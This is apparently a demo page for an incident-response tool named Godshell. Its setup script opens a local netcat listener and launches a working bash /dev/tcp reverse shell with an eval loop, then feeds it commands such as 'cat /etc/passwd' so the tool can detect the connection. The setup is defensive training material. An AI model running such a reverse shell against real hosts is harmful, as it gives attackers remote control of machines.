# 🟡 Demo 03 — "Catch the Reverse Shell"

**Difficulty:** Medium  
**Category:** Intrusion detection / network forensics  
**Estimated setup:** 3 minutes  
**Godshell tools exercised:** `summary`, `search`, `inspect`, `family`, `gonetwork_state`, `goread_environ`, `goread_shell_history`, `trace`

---

## Scenario

An attacker has gained a foothold on the machine and opened a reverse shell
back to their C2 (command & control) server. They're using a classic
`bash -i >& /dev/tcp/...` technique.

You suspect something is wrong because you see an unfamiliar outbound
connection. You ask Godshell to investigate.

**This demo is 100% local** — the "C2 server" is a netcat listener on
localhost. No real attacker involved.

---

## Setup Script

```bash
#!/usr/bin/env bash
# demos/setup_03_reverse_shell.sh
# Simulates a reverse shell to a local "C2" listener
# Everything stays on localhost — completely safe

set -e

C2_PORT=4444

echo "🎭 Setting up reverse shell demo..."
echo ""

# 1. Start the fake C2 listener
echo "[*] Starting C2 listener on port $C2_PORT..."
ncat -l -k -p $C2_PORT &
C2_PID=$!
sleep 1

# 2. Launch the "reverse shell" — connects back to our listener
#    Uses /dev/tcp which is a Bash built-in (no additional tools needed)
echo "[*] Launching reverse shell..."
bash -c "exec 5<>/dev/tcp/127.0.0.1/$C2_PORT; while read -r line <&5; do eval \"\$line\" 2>&5 >&5; done" &
SHELL_PID=$!
sleep 1

# 3. Simulate the "attacker" running some commands through the shell
echo "[*] Simulating attacker activity..."
(
  sleep 2
  echo "whoami"    > /dev/tcp/127.0.0.1/$C2_PORT 2>/dev/null || true
  sleep 1
  echo "id"        > /dev/tcp/127.0.0.1/$C2_PORT 2>/dev/null || true
  sleep 1
  echo "cat /etc/passwd" > /dev/tcp/127.0.0.1/$C2_PORT 2>/dev/null || true
  sleep 1
  echo "uname -a"  > /dev/tcp/127.0.0.1/$C2_PORT 2>/dev/null || true
) &
ATTACKER_PID=$!

echo ""
echo "╔══════════════════════════════════════════════════════════════════╗"
echo "║  C2 listener PID:     $C2_PID  (port $C2_PORT)                  "
echo "║  Reverse shell PID:   $SHELL_PID                                "
echo "║  Attacker sim PID:    $ATTACKER_PID                             "
echo "║                                                                  "
echo "║  Now ask Godshell:                                               "
echo "║                                                                  "
echo "║  > are there any suspicious outbound connections?                "
echo "║  > what process is connecting to port 4444?                      "
echo "║  > inspect that process and show its environment                 "
echo "║  > trace the syscalls of that process for 5 seconds              "
echo "║  > show the full process family tree                             "
echo "║  > what files has the reverse shell been reading?                "
echo "║                                                                  "
echo "║  To clean up:  kill $C2_PID $SHELL_PID $ATTACKER_PID            "
echo "╚══════════════════════════════════════════════════════════════════╝"
echo ""

wait
```

---

## What to Ask Godshell

This is an investigatory chain — each question builds on the previous answer:

| #   | Prompt                                          | Tool                         | What It Reveals                                                    |
| --- | ----------------------------------------------- | ---------------------------- | ------------------------------------------------------------------ |
| 1   | `are there any suspicious network connections?` | `summary`                    | Sees an outbound TCP on port 4444 — unusual                        |
| 2   | `what process is connecting to port 4444?`      | `search("4444")`             | Finds the bash reverse shell PID                                   |
| 3   | `inspect that process`                          | `inspect(pid)`               | Full cmdline shows `exec 5<>/dev/tcp/...` — textbook reverse shell |
| 4   | `show the network state for that PID`           | `gonetwork_state(pid)`       | ESTABLISHED connection to 127.0.0.1:4444, bytes flowing            |
| 5   | `what's the process family tree?`               | `family(pid)`                | Shows parent chain: terminal → bash → reverse shell                |
| 6   | `read the environment variables`                | `goread_environ(pid)`        | May reveal suspicious env vars or manipulated PATH                 |
| 7   | `trace its syscalls for 5 seconds`              | `trace(pid, 5)`              | Shows `read/write` on fd 5 — the network socket                    |
| 8   | `what has the user been typing recently?`       | `goread_shell_history(user)` | May show the attacker's initial compromise commands                |

---

## Expected Outcome

Godshell should:

1. **Flag the port 4444 connection** as unusual in the summary (it's not HTTP/HTTPS/DNS).
2. **Reveal the full reverse shell command** via `inspect` — the `exec 5<>/dev/tcp/...` pattern.
3. **Show active bidirectional data flow** via `gonetwork_state`.
4. **Trace the syscalls** showing read/write on the network file descriptor.
5. **Build the full kill chain narrative** — from initial exec to active C2 comms.

This demonstrates Godshell's ability to perform a **complete incident response
investigation** using only its built-in tools, with zero external utilities.

---

## Cleanup

```bash
kill %1 %2 %3 2>/dev/null
```
